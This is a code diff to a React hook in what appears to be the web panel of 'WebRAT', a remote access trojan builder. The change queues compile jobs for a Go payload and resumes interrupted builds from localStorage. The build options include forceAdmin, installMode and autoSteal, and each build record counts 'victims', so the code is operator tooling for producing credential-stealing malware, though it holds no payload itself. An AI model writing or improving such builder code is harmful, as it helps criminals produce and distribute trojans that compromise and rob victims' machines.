@@ -1,7 +1,7 @@
-import { useCallback, useRef } from "react";
+import { useCallback, useEffect, useRef } from "react";
 
 import { resolveAccountLogin } from "../services/get-account-login";
-import { compileGoFromConfig } from "../services/compile-go-config";
+import { downloadCompileResult, enqueueCompileGoFromConfig, waitCompileDone } from "../services/compile-go-config";
 import { downloadBlob } from "../utils/download-blob";
 import { getLastBuildTimestamp, setLastBuildTimestamp } from "../utils/last-build-ts";
 import { openBuildModal } from "../utils/build-modal";
@@ -20,6 +20,54 @@ function getBuildsKey(login: string): string {
    const safe = String(login || "").trim();
    if (!safe) return "webrat_builds";
    return "webrat_builds_" + safe;
+}
+
+type ActiveBuildState = {
+   jobId: string;
+   name: string;
+   buildId: string;
+   password: string;
+   created: string;
+};
+
+function getActiveBuildKey(login: string): string {
+   const safe = String(login || "").trim();
+   if (!safe) return "webrat_active_build";
+   return "webrat_active_build_" + safe;
+}
+
+function loadActiveBuild(login: string): ActiveBuildState | null {
+   const key = getActiveBuildKey(login);
+   try {
+      const raw = localStorage.getItem(key);
+      if (!raw) return null;
+      const parsed = JSON.parse(raw) as Partial<ActiveBuildState>;
+      const jobId = String(parsed?.jobId || "").trim();
+      const name = String(parsed?.name || "").trim();
+      const buildId = String(parsed?.buildId || "").trim();
+      const password = String(parsed?.password || "").trim();
+      const created = String(parsed?.created || "").trim();
+      if (!jobId || !name || !buildId || !password) return null;
+      return { jobId, name, buildId, password, created };
+   } catch {
+      return null;
+   }
+}
+
+function saveActiveBuild(login: string, st: ActiveBuildState) {
+   const key = getActiveBuildKey(login);
+   try {
+      localStorage.setItem(key, JSON.stringify(st));
+   } catch {
+   }
+}
+
+function clearActiveBuild(login: string) {
+   const key = getActiveBuildKey(login);
+   try {
+      localStorage.removeItem(key);
+   } catch {
+   }
 }
 
 function loadBuildsHistory(login: string): BuildHistoryItem[] {
@@ -135,6 +183,69 @@ export function useBuilderBuildFlow(opts: {
 
    const buildingRef = useRef(false);
 
+   useEffect(() => {
+      if (buildingRef.current) return;
+
+      void (async () => {
+         let login = "";
+         try {
+            login = String(localStorage.getItem("webrat_login") || "").trim();
+         } catch {
+            login = "";
+         }
+         if (!login) return;
+
+         const active = loadActiveBuild(login);
+         if (!active) return;
+
+         buildingRef.current = true;
+         setBuildingUi(true, "Building");
+
+         try {
+            await waitCompileDone(active.jobId, {
+               onTick: (st) => {
+                  const s = String(st?.status || "");
+                  if (s === "running") setBuildingUi(true, "Building");
+                  if (s === "pending") setBuildingUi(true, "Building");
+               },
+            });
+
+            const { blob, filename } = await downloadCompileResult(active.jobId, active.name);
+            setBuildingUi(true, "Build complete!");
+            downloadBlob(blob, filename);
+
+            const resolved = await resolveAccountLogin();
+            login = resolved;
+
+            const buildEntry: BuildHistoryItem = {
+               name: active.name,
+               id: active.buildId,
+               version: "0.22.2",
+               created: active.created || formatCreated(new Date()),
+               victims: 0,
+            };
+            const nextHistory = [buildEntry, ...loadBuildsHistory(login)];
+            saveBuildsHistory(login, nextHistory);
+            setLastBuildTimestamp(login, Date.now());
+
+            clearActiveBuild(login);
+
+            resetBuilderDefaults(setIconBase64, setDelay, setInstallMode);
+
+            setBuildingUi(false, "Building");
+            openBuildModal(active.password);
+         } catch {
+            try {
+               clearActiveBuild(login);
+            } catch {
+            }
+            setBuildingUi(false, "Building");
+         } finally {
+            buildingRef.current = false;
+         }
+      })();
+   }, [setDelay, setIconBase64, setInstallMode]);
+
    const startBuild = useCallback(async () => {
       if (buildingRef.current) return;
 
@@ -238,7 +349,9 @@ export function useBuilderBuildFlow(opts: {
          const resolved = await resolveAccountLogin();
          login = resolved;
 
-         const { blob, filename } = await compileGoFromConfig({
+         const created = formatCreated(new Date());
+
+         const jobId = await enqueueCompileGoFromConfig({
             name: buildName,
             password,
             forceAdmin,
@@ -254,11 +367,21 @@ export function useBuilderBuildFlow(opts: {
             autoSteal,
          });
 
+         saveActiveBuild(login, {
+            jobId,
+            name: buildName,
+            buildId,
+            password,
+            created,
+         });
+
+         await waitCompileDone(jobId);
+
+         const { blob, filename } = await downloadCompileResult(jobId, buildName);
+
          setBuildingUi(true, "Build complete!");
 
          downloadBlob(blob, filename);
-
-         const created = formatCreated(new Date());
          const buildEntry: BuildHistoryItem = { name: buildName, id: buildId, version: "0.22.2", created, victims: 0 };
 
          const nextHistory = [buildEntry, ...loadBuildsHistory(login)];
@@ -266,12 +389,19 @@ export function useBuilderBuildFlow(opts: {
 
          setLastBuildTimestamp(login, nowTs);
 
+         clearActiveBuild(login);
+
          resetBuilderDefaults(setIconBase64, setDelay, setInstallMode);
 
          setBuildingUi(false, "Building");
          openBuildModal(password);
       } catch (err) {
          setBuildingUi(false, "Building");
+
+         try {
+            clearActiveBuild(login);
+         } catch {
+         }
 
          const msg =
             err && typeof err === "object" && "message" in err
